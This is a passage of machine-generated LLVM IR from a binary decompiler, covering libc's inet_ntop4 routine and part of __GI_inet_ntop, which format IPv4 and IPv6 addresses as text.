  %stack_var_-76 = alloca i32, align 4
  %v0_8057d65 = load i32, i32* @edi, align 4
  %v0_8057d66 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8057d6a = ptrtoint i32* %stack_var_-76 to i32
  %v0_8057d6d = load i32, i32* @eax, align 4
  %v3_8057d71 = and i32 %v0_8057d6d, -65536
  %v2_8057d77 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8057d7c = load i32, i32* @edx, align 4
  %v5_8057d7c = inttoptr i32 %v0_8057d7c to i8*
  store i8* %v5_8057d7c, i8** %stack_var_-56, align 4
  %v0_8057d80 = load i32, i32* @ecx, align 4
  store i32 %v3_8057d71, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8057d8b = add i32 %v2_8057d77, 4
  store i32 %v6_8057d8b, i32* %edi.global-to-local, align 4
  %v2_8057d8c = inttoptr i32 %v6_8057d8b to i32*
  store i32 0, i32* %v2_8057d8c, align 4
  %v3_8057d8c = load i32, i32* %edi.global-to-local, align 4
  %v6_8057d8c = add i32 %v3_8057d8c, 4
  store i32 %v6_8057d8c, i32* %edi.global-to-local, align 4
  %v0_8057d8d = load i32, i32* %eax.global-to-local, align 4
  %v2_8057d8d = inttoptr i32 %v6_8057d8c to i32*
  store i32 %v0_8057d8d, i32* %v2_8057d8d, align 4
  %v3_8057d8d = load i32, i32* %edi.global-to-local, align 4
  %v6_8057d8d = add i32 %v3_8057d8d, 4
  store i32 %v6_8057d8d, i32* %edi.global-to-local, align 4
  %v0_8057d8e = load i32, i32* %eax.global-to-local, align 4
  %v1_8057d8e = trunc i32 %v0_8057d8e to i16
  %v3_8057d8e = inttoptr i32 %v6_8057d8d to i16*
  store i16 %v1_8057d8e, i16* %v3_8057d8e, align 2
  %v4_8057d8e = load i32, i32* %edi.global-to-local, align 4
  %v7_8057d8e = add i32 %v4_8057d8e, 2
  %v0_8057d90 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057d90 = trunc i32 %v0_8057d90 to i8
  %v3_8057d90 = inttoptr i32 %v7_8057d8e to i8*
  store i8 %v1_8057d90, i8* %v3_8057d90, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8057e2b30 = load i32, i32* @esi, align 4
  %v10_8057e2b36 = icmp eq i32 %v0_8057e2b30, 3
  store i1 %v10_8057e2b36, i1* %zf.global-to-local, align 1
  %v7_8057e2e38 = icmp sgt i32 %v0_8057e2b30, 3
  br i1 %v7_8057e2e38, label %dec_label_pc_8057e34, label %dec_label_pc_8057d98

dec_label_pc_8057d98:                             ; preds = %dec_label_pc_8057e0b, %entry
  %v3_8057dae = phi i32 [ 0, %entry ], [ %v1_8057e34.pre, %dec_label_pc_8057e0b ]
  %v0_8057e2b39 = phi i32 [ %v0_8057e2b30, %entry ], [ %v0_8057e2b, %dec_label_pc_8057e0b ]
  %v2_8057d9e = add i32 %v0_8057e2b39, %v0_8057d6d
  %v12_8057d9e = icmp eq i32 %v2_8057d9e, 0
  store i1 %v12_8057d9e, i1* %zf.global-to-local, align 1
  store i32 %v2_8057d9e, i32* %ebp.global-to-local, align 4
  %v1_8057da0 = inttoptr i32 %v2_8057d9e to i8*
  %v2_8057da0 = load i8, i8* %v1_8057da0, align 1
  %v3_8057da0 = zext i8 %v2_8057da0 to i32
  %v4_8057da0 = load i32, i32* @edx, align 4
  %v5_8057da0 = and i32 %v4_8057da0, -65536
  %v6_8057da0 = or i32 %v5_8057da0, %v3_8057da0
  store i32 %v6_8057da0, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8057da0, 100
  %v6_8057da7 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8057da0, 100
  %v12_8057da7 = zext i8 %tmp24 to i32
  %v14_8057da7 = mul nuw nsw i32 %v12_8057da7, 256
  %v15_8057da7 = or i32 %v6_8057da7, %v5_8057da0
  %v16_8057da7 = or i32 %v15_8057da7, %v14_8057da7
  store i32 %v16_8057da7, i32* %eax.global-to-local, align 4
  %v2_8057dab = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8057dae = load i32, i32* @esp, align 4
  %v4_8057dae = add i32 %v2_8057dae, 43
  %v5_8057dae = add i32 %v4_8057dae, %v3_8057dae
  %v6_8057dae = inttoptr i32 %v5_8057dae to i8*
  store i8 %v2_8057dab, i8* %v6_8057dae, align 1
  %v0_8057db2 = load i32, i32* %edi.global-to-local, align 4
  %v1_8057db2 = add i32 %v0_8057db2, 1
  store i32 %v0_8057db2, i32* @ecx, align 4
  %v0_8057dbb = load i32, i32* @esp, align 4
  %v2_8057dbb = add i32 %v0_8057db2, 43
  %v3_8057dbb = add i32 %v2_8057dbb, %v0_8057dbb
  %v4_8057dbb = inttoptr i32 %v3_8057dbb to i8*
  %v5_8057dbb = load i8, i8* %v4_8057dbb, align 1
  %v11_8057dbb = icmp eq i8 %v5_8057dbb, 48
  store i1 %v11_8057dbb, i1* %zf.global-to-local, align 1
  %v1_8057dc0 = icmp eq i1 %v11_8057dbb, false
  %v0_8057dea = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8057dc0, label %dec_label_pc_8057de8, label %dec_label_pc_8057dc2

dec_label_pc_8057dc2:                             ; preds = %dec_label_pc_8057d98
  %v3_8057dc6 = trunc i32 %v0_8057dea to i16
  %v5_8057dc6 = udiv i16 %v3_8057dc6, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8057dc6, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8057dd8 = trunc i16 %tmp42 to i8
  %v2_8057dd8 = or i8 %v1_8057dd8, 48
  %v12_8057dd8 = zext i8 %v2_8057dd8 to i32
  store i32 %v12_8057dd8, i32* %eax.global-to-local, align 4
  %v7_8057dda = icmp eq i8 %v1_8057dd8, 0
  store i1 %v7_8057dda, i1* %zf.global-to-local, align 1
  store i8 %v2_8057dd8, i8* %v4_8057dbb, align 1
  %v0_8057de0 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8057de0, label %dec_label_pc_8057e0b, label %dec_label_pc_8057de2

dec_label_pc_8057de2:                             ; preds = %dec_label_pc_8057dc2
  store i32 %v1_8057db2, i32* @ecx, align 4
  br label %dec_label_pc_8057e0b

dec_label_pc_8057de8:                             ; preds = %dec_label_pc_8057d98
  store i32 %v1_8057db2, i32* %ebx.global-to-local, align 4
  %v3_8057df0 = trunc i32 %v0_8057dea to i16
  %v5_8057df0 = udiv i16 %v3_8057df0, 10
  %tmp43 = urem i16 %v5_8057df0, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8057e00 = add i32 %v0_8057db2, 2
  store i32 %v1_8057e00, i32* @ecx, align 4
  %v1_8057e05 = trunc i16 %tmp44 to i8
  %v2_8057e05 = or i8 %v1_8057e05, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8057e05 = zext i8 %v2_8057e05 to i32
  store i32 %v12_8057e05, i32* %eax.global-to-local, align 4
  %v4_8057e07 = add i32 %v0_8057db2, 44
  %v5_8057e07 = add i32 %v4_8057e07, %v0_8057dbb
  %v6_8057e07 = inttoptr i32 %v5_8057e07 to i8*
  store i8 %v2_8057e05, i8* %v6_8057e07, align 1
  br label %dec_label_pc_8057e0b

dec_label_pc_8057e0b:                             ; preds = %dec_label_pc_8057dc2, %dec_label_pc_8057de2, %dec_label_pc_8057de8
  %v0_8057e0b = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057e0b = inttoptr i32 %v0_8057e0b to i8*
  %v2_8057e0b = load i8, i8* %v1_8057e0b, align 1
  %v3_8057e0b = zext i8 %v2_8057e0b to i32
  store i32 %v3_8057e0b, i32* %eax.global-to-local, align 4
  %v0_8057e14 = load i32, i32* @esi, align 4
  %v1_8057e14 = add i32 %v0_8057e14, 1
  store i32 %v1_8057e14, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8057e19 = load i32, i32* @esp, align 4
  %v1_8057e19 = load i32, i32* @ecx, align 4
  %v2_8057e19 = add i32 %v0_8057e19, 44
  %v3_8057e19 = add i32 %v2_8057e19, %v1_8057e19
  %v4_8057e19 = inttoptr i32 %v3_8057e19 to i8*
  store i8 46, i8* %v4_8057e19, align 1
  %v0_8057e1e = load i32, i32* @ecx, align 4
  %v1_8057e1e = add i32 %v0_8057e1e, 2
  store i32 %v1_8057e1e, i32* %edi.global-to-local, align 4
  %v0_8057e21 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057e21 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057e21 = zext i32 %v1_8057e21 to i64
  %v3_8057e21 = load i32, i32* %edx.global-to-local, align 4
  %v4_8057e21 = zext i32 %v3_8057e21 to i64
  %v5_8057e21 = mul nuw i64 %v4_8057e21, 4294967296
  %v6_8057e21 = or i64 %v5_8057e21, %v2_8057e21
  %v7_8057e21 = zext i32 %v0_8057e21 to i64
  %v8_8057e21 = udiv i64 %v6_8057e21, %v7_8057e21
  %v9_8057e21 = trunc i64 %v8_8057e21 to i32
  %v10_8057e21 = urem i64 %v6_8057e21, %v7_8057e21
  %v11_8057e21 = trunc i64 %v10_8057e21 to i32
  store i32 %v11_8057e21, i32* @edx, align 4
  %v3_8057e23 = and i32 %v9_8057e21, -256
  %v1_8057e25 = trunc i64 %v10_8057e21 to i8
  %v2_8057e25 = add i8 %v1_8057e25, 48
  %v12_8057e25 = zext i8 %v2_8057e25 to i32
  %v15_8057e25 = or i32 %v12_8057e25, %v3_8057e23
  store i32 %v15_8057e25, i32* %eax.global-to-local, align 4
  %v2_8057e27 = load i32, i32* @esp, align 4
  %v4_8057e27 = add i32 %v0_8057e1e, 43
  %v5_8057e27 = add i32 %v4_8057e27, %v2_8057e27
  %v6_8057e27 = inttoptr i32 %v5_8057e27 to i8*
  store i8 %v2_8057e25, i8* %v6_8057e27, align 1
  %v0_8057e2b = load i32, i32* @esi, align 4
  %v10_8057e2b = icmp eq i32 %v0_8057e2b, 3
  store i1 %v10_8057e2b, i1* %zf.global-to-local, align 1
  %v7_8057e2e = icmp sgt i32 %v0_8057e2b, 3
  %v1_8057e34.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8057e2e, label %dec_label_pc_8057e34, label %dec_label_pc_8057d98

dec_label_pc_8057e34:                             ; preds = %dec_label_pc_8057e0b, %entry
  %v1_8057e34 = phi i32 [ 0, %entry ], [ %v1_8057e34.pre, %dec_label_pc_8057e0b ]
  %v0_8057e34 = load i32, i32* @esp, align 4
  %v2_8057e34 = add i32 %v0_8057e34, 42
  %v3_8057e34 = add i32 %v2_8057e34, %v1_8057e34
  %v4_8057e34 = inttoptr i32 %v3_8057e34 to i8*
  store i8 0, i8* %v4_8057e34, align 1
  %v0_8057e39 = load i32, i32* @esp, align 4
  %v9_8057e39 = icmp eq i32 %v0_8057e39, 12
  store i1 %v9_8057e39, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8057e41 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8057e41, i32* @eax, align 4
  %v15_8057e49 = icmp eq i32 %v3_8057e41, %v0_8057d80
  store i1 %v15_8057e49, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_8057e41, %v0_8057d80
  br i1 %tmp45, label %dec_label_pc_8057e4f, label %dec_label_pc_8057e5e

dec_label_pc_8057e4f:                             ; preds = %dec_label_pc_8057e34
  %v0_8057e4f = load i8*, i8** %stack_var_-92, align 4
  %v1_8057e4f = ptrtoint i8* %v0_8057e4f to i32
  %v2_8057e4f = call i32 @__errno_location(i32 %v1_8057e4f)
  %v1_8057e54 = inttoptr i32 %v2_8057e4f to i32*
  store i32 28, i32* %v1_8057e54, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8057e6d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057e6d

dec_label_pc_8057e5e:                             ; preds = %dec_label_pc_8057e34
  %v2_8057e3c = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_8057e614 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8057e614, i32* %tmp29, align 4
  %v0_8057e65.cast = inttoptr i32 %v3_8057e614 to i8*
  %v4_8057e65 = call i32 @strcpy(i8* %v0_8057e65.cast, i32 %v2_8057e3c)
  store i32 %v4_8057e65, i32* %eax.global-to-local, align 4
  %v0_8057e6a = load i32, i32* @esp, align 4
  %v6_8057e6a = icmp eq i32 %v0_8057e6a, -16
  store i1 %v6_8057e6a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8057e6d

dec_label_pc_8057e6d:                             ; preds = %dec_label_pc_8057e4f, %dec_label_pc_8057e5e
  %v0_8057e74 = phi i32 [ 0, %dec_label_pc_8057e4f ], [ %v4_8057e65, %dec_label_pc_8057e5e ]
  %v0_8057e6d = phi i32 [ %v0_8057e6d.pre, %dec_label_pc_8057e4f ], [ %v15_8057d6a, %dec_label_pc_8057e5e ]
  %v9_8057e6d = icmp eq i32 %v0_8057e6d, -60
  store i1 %v9_8057e6d, i1* %zf.global-to-local, align 1
  store i32 %v0_8057d66, i32* @esi, align 4
  store i32 %v0_8057d65, i32* @edi, align 4
  ret i32 %v0_8057e74

; uselistorder directives
  uselistorder i32 %v0_8057e2b, { 2, 0, 1 }
  uselistorder i8 %v2_8057e05, { 1, 0 }
  uselistorder i32 %v0_8057dea, { 1, 0 }
  uselistorder i1 %v11_8057dbb, { 1, 0 }
  uselistorder i32 %v1_8057db2, { 1, 0 }
  uselistorder i32 %v5_8057da0, { 1, 0 }
  uselistorder i32 %v0_8057e2b30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 26, 27, 28, 17, 19, 20, 16, 18, 11, 21, 15, 22, 23, 24, 25, 29, 39, 40, 12, 34, 30, 13, 31, 32, 33, 35, 36, 14, 37, 38, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 4, 43, 44, 0, 1, 45, 46, 47, 50, 2, 3, 55, 56, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 48, 49, 51, 52, 53, 54 }
  uselistorder label %dec_label_pc_8057e6d, { 1, 0 }
  uselistorder label %dec_label_pc_8057e0b, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8057e76 = load i32, i32* @edi, align 4
  %v0_8057e77 = load i32, i32* @esi, align 4
  %v0_8057e78 = load i32, i32* @ebx, align 4
  %v15_8057e79 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8057e80 = icmp eq i32 %arg1, 2
  br i1 %v9_8057e80, label %dec_label_pc_8057e90, label %dec_label_pc_8057e85

dec_label_pc_8057e85:                             ; preds = %entry
  %v9_8057e85 = icmp eq i32 %arg1, 10
  %v1_8057e88 = icmp eq i1 %v9_8057e85, false
  br i1 %v1_8057e88, label %dec_label_pc_805802f, label %dec_label_pc_8057ea8

dec_label_pc_8057e90:                             ; preds = %entry
  %v4_8057e90 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8057e90, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8057e9c = call i32 @inet_ntop4(i32 %v0_8057e78, i32 %v0_8057e77, i32 %v0_8057e76)
  store i32 %v3_8057e9c, i32* %eax.global-to-local, align 4
  store i32 %v3_8057e9c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805803c

dec_label_pc_8057ea8:                             ; preds = %dec_label_pc_8057e85
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8057ead = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8057ead, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8057eb2 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8057eb2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8057ed4 = add i32 %arg2, 1
  br label %dec_label_pc_8057ebe

dec_label_pc_8057ebe:                             ; preds = %dec_label_pc_8057ebe.dec_label_pc_8057ebe_crit_edge, %dec_label_pc_8057ea8
  %v1_8057ee1 = phi i32 [ %v15_8057e79, %dec_label_pc_8057ea8 ], [ %v1_8057ee1.pre, %dec_label_pc_8057ebe.dec_label_pc_8057ebe_crit_edge ]
  %v0_8057ed970 = phi i32 [ 0, %dec_label_pc_8057ea8 ], [ %v0_8057ee5.pre, %dec_label_pc_8057ebe.dec_label_pc_8057ebe_crit_edge ]
  %v1_8057ec7 = ashr i32 %v0_8057ed970, 31
  %v2_8057ec8 = zext i32 %v0_8057ed970 to i64
  %v4_8057ec8 = zext i32 %v1_8057ec7 to i64
  %v5_8057ec8 = mul nuw i64 %v4_8057ec8, 4294967296
  %v6_8057ec8 = or i64 %v5_8057ec8, %v2_8057ec8
  %v8_8057ec8 = sdiv i64 %v6_8057ec8, 2
  %v9_8057ec8 = trunc i64 %v8_8057ec8 to i32
  store i32 %v9_8057ec8, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8057ec8, i32* %ebx.global-to-local, align 4
  %v2_8057ed0 = add i32 %v0_8057ed970, %arg2
  %v3_8057ed0 = inttoptr i32 %v2_8057ed0 to i8*
  %v4_8057ed0 = load i8, i8* %v3_8057ed0, align 1
  %v5_8057ed0 = zext i8 %v4_8057ed0 to i32
  store i32 %v5_8057ed0, i32* %eax.global-to-local, align 4
  %v3_8057ed4 = add i32 %v2_8057ed4, %v0_8057ed970
  %v4_8057ed4 = inttoptr i32 %v3_8057ed4 to i8*
  %v5_8057ed4 = load i8, i8* %v4_8057ed4, align 1
  %v6_8057ed4 = zext i8 %v5_8057ed4 to i32
  store i32 %v6_8057ed4, i32* %edx.global-to-local, align 4
  %v1_8057ed9 = add i32 %v0_8057ed970, 2
  store i32 %v1_8057ed9, i32* %ecx.global-to-local, align 4
  %v2_8057edc = mul nuw nsw i32 %v5_8057ed0, 256
  %v2_8057edf = or i32 %v6_8057ed4, %v2_8057edc
  store i32 %v2_8057edf, i32* %eax.global-to-local, align 4
  %v3_8057ee1 = mul i32 %v9_8057ec8, 4
  %v4_8057ee1 = add i32 %v3_8057ee1, 60
  %v5_8057ee1 = add i32 %v4_8057ee1, %v1_8057ee1
  %v6_8057ee1 = inttoptr i32 %v5_8057ee1 to i32*
  store i32 %v2_8057edf, i32* %v6_8057ee1, align 4
  %v0_8057ee5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8057ee8 = icmp sgt i32 %v0_8057ee5.pre, 15
  br i1 %v7_8057ee8, label %dec_label_pc_8057eea, label %dec_label_pc_8057ebe.dec_label_pc_8057ebe_crit_edge

dec_label_pc_8057ebe.dec_label_pc_8057ebe_crit_edge: ; preds = %dec_label_pc_8057ebe
  %v1_8057ee1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057ebe

dec_label_pc_8057eea:                             ; preds = %dec_label_pc_8057ebe
  %v4_8057ea8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8057ef4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057ef4

dec_label_pc_8057ef4:                             ; preds = %dec_label_pc_8057eea, %dec_label_pc_8057f21
  %v0_8057f2169 = phi i32 [ 0, %dec_label_pc_8057eea ], [ %v1_8057f21, %dec_label_pc_8057f21 ]
  %v0_8057f0c68 = phi i32 [ -1, %dec_label_pc_8057eea ], [ %v0_8057f0c8, %dec_label_pc_8057f21 ]
  %v0_8057f2c67 = phi i32 [ -1, %dec_label_pc_8057eea ], [ %v0_8057f119, %dec_label_pc_8057f21 ]
  %v0_8057f3766 = phi i32 [ -1, %dec_label_pc_8057eea ], [ %v0_8057f1c13, %dec_label_pc_8057f21 ]
  %v2_8057ef4 = mul nuw nsw i32 %v0_8057f2169, 4
  %v3_8057ef4 = add nuw nsw i32 %v2_8057ef4, 60
  %v4_8057ef4 = add i32 %v3_8057ef4, %v0_8057ef4.pre
  %v5_8057ef4 = inttoptr i32 %v4_8057ef4 to i32*
  %v6_8057ef4 = load i32, i32* %v5_8057ef4, align 4
  %v7_8057ef4 = icmp eq i32 %v6_8057ef4, 0
  %v1_8057ef9 = icmp eq i1 %v7_8057ef4, false
  %v10_8057f0c = icmp eq i32 %v0_8057f0c68, -1
  br i1 %v1_8057ef9, label %dec_label_pc_8057f0c, label %dec_label_pc_8057efb

dec_label_pc_8057efb:                             ; preds = %dec_label_pc_8057ef4
  %v1_8057efe = icmp eq i1 %v10_8057f0c, false
  br i1 %v1_8057efe, label %dec_label_pc_8057f09, label %dec_label_pc_8057f00

dec_label_pc_8057f00:                             ; preds = %dec_label_pc_8057efb
  store i32 %v0_8057f2169, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057f21

dec_label_pc_8057f09:                             ; preds = %dec_label_pc_8057efb
  %v0_8057f09 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057f09 = add i32 %v0_8057f09, 1
  store i32 %v1_8057f09, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057f21

dec_label_pc_8057f0c:                             ; preds = %dec_label_pc_8057ef4
  br i1 %v10_8057f0c, label %dec_label_pc_8057f21, label %dec_label_pc_8057f11

dec_label_pc_8057f11:                             ; preds = %dec_label_pc_8057f0c
  %v10_8057f11 = icmp eq i32 %v0_8057f2c67, -1
  %v0_8057f1a.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057f16 = load i32, i32* @ebp, align 4
  %v7_8057f18 = icmp sgt i32 %v0_8057f1a.pre, %v1_8057f16
  %or.cond = or i1 %v10_8057f11, %v7_8057f18
  br i1 %or.cond, label %dec_label_pc_8057f1a, label %dec_label_pc_8057f1e

dec_label_pc_8057f1a:                             ; preds = %dec_label_pc_8057f11
  store i32 %v0_8057f1a.pre, i32* @ebp, align 4
  store i32 %v0_8057f3766, i32* @edi, align 4
  br label %dec_label_pc_8057f1e

dec_label_pc_8057f1e:                             ; preds = %dec_label_pc_8057f11, %dec_label_pc_8057f1a
  %v0_8057f1111 = phi i32 [ %v0_8057f3766, %dec_label_pc_8057f1a ], [ %v0_8057f2c67, %dec_label_pc_8057f11 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057f21

dec_label_pc_8057f21:                             ; preds = %dec_label_pc_8057f0c, %dec_label_pc_8057f09, %dec_label_pc_8057f00, %dec_label_pc_8057f1e
  %v0_8057f1c13 = phi i32 [ %v0_8057f3766, %dec_label_pc_8057f0c ], [ %v0_8057f3766, %dec_label_pc_8057f09 ], [ %v0_8057f2169, %dec_label_pc_8057f00 ], [ -1, %dec_label_pc_8057f1e ]
  %v0_8057f0c8 = phi i32 [ -1, %dec_label_pc_8057f0c ], [ %v0_8057f0c68, %dec_label_pc_8057f09 ], [ %v0_8057f2169, %dec_label_pc_8057f00 ], [ -1, %dec_label_pc_8057f1e ]
  %v0_8057f119 = phi i32 [ %v0_8057f2c67, %dec_label_pc_8057f0c ], [ %v0_8057f2c67, %dec_label_pc_8057f09 ], [ %v0_8057f2c67, %dec_label_pc_8057f00 ], [ %v0_8057f1111, %dec_label_pc_8057f1e ]
  %v1_8057f21 = add nuw nsw i32 %v0_8057f2169, 1
  store i32 %v1_8057f21, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8057f21, 8
  br i1 %exitcond, label %dec_label_pc_8057f27, label %dec_label_pc_8057ef4

dec_label_pc_8057f27:                             ; preds = %dec_label_pc_8057f21
  %v10_8057f27 = icmp eq i32 %v0_8057f1c13, -1
  br i1 %v10_8057f27, label %dec_label_pc_8057f39, label %dec_label_pc_8057f2c

dec_label_pc_8057f2c:                             ; preds = %dec_label_pc_8057f27
  %v10_8057f2c = icmp eq i32 %v0_8057f119, -1
  %v0_8057f35.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8057f2c, label %dec_label_pc_8057f35, label %dec_label_pc_8057f31

dec_label_pc_8057f31:                             ; preds = %dec_label_pc_8057f2c
  %v1_8057f31 = load i32, i32* @ebp, align 4
  %v7_8057f33 = icmp sgt i32 %v0_8057f35.pre, %v1_8057f31
  br i1 %v7_8057f33, label %dec_label_pc_8057f35, label %dec_label_pc_8057f39

dec_label_pc_8057f35:                             ; preds = %dec_label_pc_8057f2c, %dec_label_pc_8057f31
  store i32 %v0_8057f35.pre, i32* @ebp, align 4
  store i32 %v0_8057f1c13, i32* @edi, align 4
  br label %dec_label_pc_8057f39

dec_label_pc_8057f39:                             ; preds = %dec_label_pc_8057f31, %dec_label_pc_8057f27, %dec_label_pc_8057f35
  %v5_8057f46 = phi i32 [ %v0_8057f119, %dec_label_pc_8057f31 ], [ %v0_8057f119, %dec_label_pc_8057f27 ], [ %v0_8057f1c13, %dec_label_pc_8057f35 ]
  %v10_8057f39 = icmp eq i32 %v5_8057f46, -1
  br i1 %v10_8057f39, label %dec_label_pc_8057f49, label %dec_label_pc_8057f3e

dec_label_pc_8057f3e:                             ; preds = %dec_label_pc_8057f39
  %v0_8057f3e = load i32, i32* @ebp, align 4
  %v1_8057f3e = add i32 %v0_8057f3e, -1
  %v6_8057f3e = sub i32 0, %v0_8057f3e
  %v7_8057f3e = and i32 %v0_8057f3e, %v6_8057f3e
  %v8_8057f3e = icmp slt i32 %v7_8057f3e, 0
  %v9_8057f3e = icmp eq i32 %v1_8057f3e, 0
  %v10_8057f3e = icmp slt i32 %v1_8057f3e, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8057f46 = icmp ne i1 %v10_8057f3e, %v8_8057f3e
  %v4_8057f46 = or i1 %v9_8057f3e, %v3_8057f46
  %v7_8057f46 = select i1 %v4_8057f46, i32 -1, i32 %v5_8057f46
  store i32 %v7_8057f46, i32* @edi, align 4
  br label %dec_label_pc_8057f49

dec_label_pc_8057f49:                             ; preds = %dec_label_pc_8057f39, %dec_label_pc_8057f3e
  %v0_8057fe918 = phi i32 [ %v5_8057f46, %dec_label_pc_8057f39 ], [ %v7_8057f46, %dec_label_pc_8057f3e ]
  %v2_8057f49 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8057f49, i32* @ebx, align 4
  %v3_8057fcb = add i32 %v4_8057ea8, 64
  %v12_8057f89 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8057fe958 = icmp eq i32 %v0_8057fe918, -1
  %v1_8057f91 = icmp eq i1 %v12_8057f89, false
  br label %dec_label_pc_8057f54

dec_label_pc_8057f54:                             ; preds = %dec_label_pc_8057f49, %dec_label_pc_8057fdf
  %v10_8057fe965 = phi i1 [ %v10_8057fe958, %dec_label_pc_8057f49 ], [ %v10_8057fe9, %dec_label_pc_8057fdf ]
  %v0_8057f6e64 = phi i32 [ 0, %dec_label_pc_8057f49 ], [ %v1_8057fdf, %dec_label_pc_8057fdf ]
  %v1_8057f6463 = phi i32 [ %v0_8057fe918, %dec_label_pc_8057f49 ], [ %v0_8057fe9.pre, %dec_label_pc_8057fdf ]
  %v0_8057f7262 = phi i32 [ %v2_8057f49, %dec_label_pc_8057f49 ], [ %v0_8057f6819, %dec_label_pc_8057fdf ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_8057f49 ], [ %stack_var_-120.0, %dec_label_pc_8057fdf ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_8057f49 ], [ %stack_var_-116.0, %dec_label_pc_8057fdf ]
  br i1 %v10_8057fe965, label %dec_label_pc_8057f6e, label %dec_label_pc_8057f59

